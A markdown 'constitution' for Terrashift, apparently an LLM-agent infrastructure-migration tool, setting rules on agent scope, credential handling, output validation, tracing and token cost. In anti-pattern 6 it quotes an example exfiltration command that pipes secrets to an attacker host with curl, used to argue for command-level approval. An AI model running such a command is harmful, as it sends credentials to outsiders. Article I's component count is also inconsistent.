# Terrashift Constitution

The constitution is the source of truth for how Terrashift gets built. It is referenced in PR descriptions and reviewed at every stage gate. Thirteen articles in total — twelve foundational, plus Article XIII lifted from `stakpak_arch.md` section 42 with Terrashift-specific commentary.

The articles work together. Article I (architectural restraint) makes Article XII (token economy) achievable. Article V (credentials) requires Article X (observability) to be enforceable. Article XIII (anti-patterns) is the concrete checklist that operationalises the abstract principles in I-XII.

This file is the authoritative version. The version in `terrashift_plan.md` and `Terrashift_Plan.docx` is a copy; if they diverge, this file wins.

---

## Article I — Architectural restraint

Of the nine pipeline components, only three are agents: Recovery, Cost Optimizer, and Cutover. The other six (Scanner, Mapper, Planner, Generator, Validator, Executor, Verifier — Mapper and Planner are LLM-with-structured-output, the rest are pure deterministic Rust) do not loop. Adding a new agent requires explicit RFC and stage-gate approval.

Sub-clause I.4: agents have bounded blast radius via the subagent permission model from `stakpak_arch.md` section 8. Each agent has a scoped tool set registered at construction time; permission scoping is enforced at the registry boundary, not at call time.

## Article II — Reference codebase discipline

Stakpak is the primary architectural reference, with `stakpak_arch.md` (~2,840 lines) as the canonical document. Claude Code is the secondary reference for agent-loop concepts. All three are checked out locally on every team member's machine at `~/refs/`.

PR descriptions cite which `stakpak_arch.md` sections informed each implementation choice. Code comments include a `// Pattern: stakpak_arch.md section N` line at the top of any file that adopted a Stakpak pattern.

## Article III — AI safety

Every LLM-emitted attribute is checked against the live provider schema before HCL emit. Hallucinations are a build break, not a runtime warning. The Validator (`libs/engine/src/validator`) is the single enforcement point and **must** be on the path between Mapper and Generator. Bypassing the Validator is a CI failure.

## Article IV — Failure mode handling

Failures are loud. No silent fallbacks, no swallowed errors. If you can't tell the user what went wrong, don't continue. This is operationalised via Article XIII rule 3 (no `unwrap`/`expect`/`&s[..n]` in production code paths) and the workspace-level Clippy lint posture from `stakpak_arch.md` section 31.

## Article V — Credentials and security

No long-lived credentials in process memory. **Two credential classes** are protected:

1. **Cloud provider credentials** — AWS STS, GCP ADC + workload identity federation, Azure managed identity. Short-lived federated tokens only, never long-lived keys.
2. **LLM provider keys** — Anthropic, OpenAI, custom Vodafone gateway, etc. `api_key_env` references resolved by the broker at runtime, zeroized after each request, never held as instance fields on the `Client` struct.

The LLM never sees raw secrets of either class — only references resolved at the tool-execution boundary, mirroring the secret substitution pattern in `stakpak_arch.md` section 27. Every credential operation is audited.

Audit entries for LLM-touching operations record `provider`, `model_id`, and `provider_endpoint` so compliance reviewers can answer "which model produced this artifact?" without ambiguity. Customer-supplied API keys never appear in any log, trace span, or error message — the redaction layer (Article XIII rule 5) catches them at the proxy boundary.

Article XIII rules 5, 6, 7, and 10 are the concrete enforcement of Article V's principles.

## Article VI — Knowledge layer integrity

Provider schemas are version-pinned per migration. The same migration today produces the same output six months from now. No "latest" anywhere in production paths. Per `stakpak_arch.md` section 23, version pinning is what makes prompt caching work — non-monotonic cache behaviour kills cache hits and breaks Article XII rule 2.

## Article VII — Repository hygiene

Trunk-based development. No long-lived feature branches. PRs ≤500 lines preferred. Constitution articles cited in PR descriptions.

CI enforces the lint posture from `stakpak_arch.md` section 31:

```toml
[workspace.lints.clippy]
unwrap_used = "deny"
expect_used = "deny"
string_slice = "deny"
```

## Article VIII — Stage gates

Stages don't progress without exit-gate sign-off. Stage 1 ships before Stage 2 starts. No parallel stage development.

**Sub-clause VIII.3:** "adding agentic complexity in Stage 2 must not increase happy-path Stage-1 migration cost by more than 1.3×." The same principle applies to every stage transition.

## Article IX — Data governance

State files, audit logs, and migration outputs are user property. We never delete user data automatically. Archival, never deletion.

Audit log entries written via `libs/audit` are append-only and chain-verified.

## Article X — Observability

Every LLM call, every tool invocation, every pipeline stage gets a `tracing` span. Logs are structured. No `println!` in production code paths. Mirrors `stakpak_arch.md` section 32's tracing pattern with optional OpenTelemetry export behind a feature flag.

LLM call spans include attributes: `provider`, `model_id`, `tier`, `input_tokens`, `output_tokens`, `cache_read_tokens`, `cache_write_tokens`, `cost_usd_micros`. Tool execution spans include `tool_name` and `duration_ms`. These are non-optional — Article V's audit invariant requires them.

## Article XI — Amendments

The constitution is amended by RFC. Amendments are versioned. Major version bumps require team consensus.

Article XIII can grow over time as new anti-patterns are discovered during development; growth itself is an Article XI amendment, recorded in this file's git history.

## Article XII — Token economy

Five enforceable rules:

1. Every component has a documented per-tier cost ceiling against the eval baseline. The ceiling is per-tier (eco / smart) not per-migration; absolute per-migration costs depend on which model the customer chose within each tier (BYOK choice).
2. Cache-first: lookup → vector search → cold LLM call, in that order. Per Article XIII rule 2, cache-first behaviour requires monotonic trim boundaries.
3. Tiered routing: every LLM-using component is bound to a tier (eco / smart), not a specific model. Concrete model is resolved at runtime per the 5-layer chain in `terrashift_plan.md` section 6.X.
4. CI regression gate: >30% token cost increase against the prior baseline blocks PR merge. This is what protects customers from silent system-wide cost drift even when their model choice changes.
5. Monthly review: top-10 most expensive prompts (regardless of tier) are audited and optimized.

Article XII is enforced by the eval framework's token-tracking (`libs/eval`), not by reviewer vigilance.

## Article XIII — Source-derived anti-patterns

Ten anti-patterns lifted directly from `stakpak_arch.md` section 42 — battle-scarred lessons from 295 branches and ~177k LOC of Rust development on Stakpak. These are mistakes the original codebase has already made (and fixed) or actively avoids. Terrashift inherits the discipline. New anti-patterns discovered during Terrashift development are added here with citations to where they were first encountered.

| # | Anti-pattern | Maps to |
|---|---|---|
| 1 | Don't bypass the message conversion pipeline. Skipping `ContextReducer::reduce` and feeding raw messages to the LLM produces Anthropic 400s on dangling `tool_use` blocks. | Article III (AI safety enforcement) |
| 2 | Don't make trim boundaries non-monotonic. If `trimmed_up_to_message_index` ever goes backward, every Anthropic prompt-cache hit dies. | Article XII rule 2 (cache-first requires cache-stable inputs) |
| 3 | Don't `unwrap()` / `expect()` / `&s[..n]` outside tests. Clippy must block these in production crates. | Article IV (failures must be loud, not panics) |
| 4 | Don't conflate `ChatMessage` and `LLMMessage`. Storage type vs runtime type. Mixing them creates conversion mistakes that compile but fail at runtime. | Type discipline; enforced via `libs/shared` boundary |
| 5 | Don't bypass the proxy redaction layer. If a tool result reaches the LLM without going through `redact_content`, secrets leak. | Article V (credentials and security) |
| 6 | Don't approve `run_command` (or `terraform apply`) wholesale. Use tree-sitter command-level approval. Otherwise `cat secrets \| curl http://attacker.com` looks like one approved tool call. | Article V (command-level approval per `stakpak_arch.md` section 30) |
| 7 | Don't write disk-bound secrets to make sandbox UID issues "go away". The container-side UID handoff (gosu pattern) exists specifically to avoid this. | Article V (credential lifecycle) |
| 8 | Don't add a new `OutputEvent`/`InputEvent` variant without updating `is_backend_event()`. Silent UI freezes when popups are open are the failure mode. | Article IV (failures must be loud) |
| 9 | Don't push a `tool_result` for a tool that was Cancelled when the queue is empty. The runtime expects the TUI's shell/retry flow to send `SendToolResult`. Adding a redundant push creates a duplicate `tool_call_id` and breaks Anthropic. | Operational invariant from `stakpak_arch.md` section 8 |
| 10 | Don't store an API key in a profile that lives outside `~/.terrashift/`. Credential resolution chain depends on file location. | Article V (credentials) |

Article XIII is the canonical source-derived discipline list. Reviewers can link to "Article XIII rule N" in PR comments instead of re-explaining a concern from scratch. The list grows over time — if Terrashift development surfaces a new anti-pattern, it's added here with a citation to the incident or PR where it was first encountered.

---

## Citing the constitution in PRs

PR descriptions should include a "Constitution" section listing the articles touched. Example:

```markdown
## Constitution
- Article III (Validator gate enforced — see new test in libs/engine/tests/validator_hallucination.rs)
- Article V (no new credential surface; existing broker handles new provider key)
- Article XIII rule 5 (redaction boundary unchanged; verified by integration test)
```

Reviewers check the cited articles match the actual change shape. Mismatches are a request-changes signal.

---

*This file is the authoritative version of the Terrashift constitution. Last amended: ${date by next amendment}. Maintainers: the Terrashift team.*
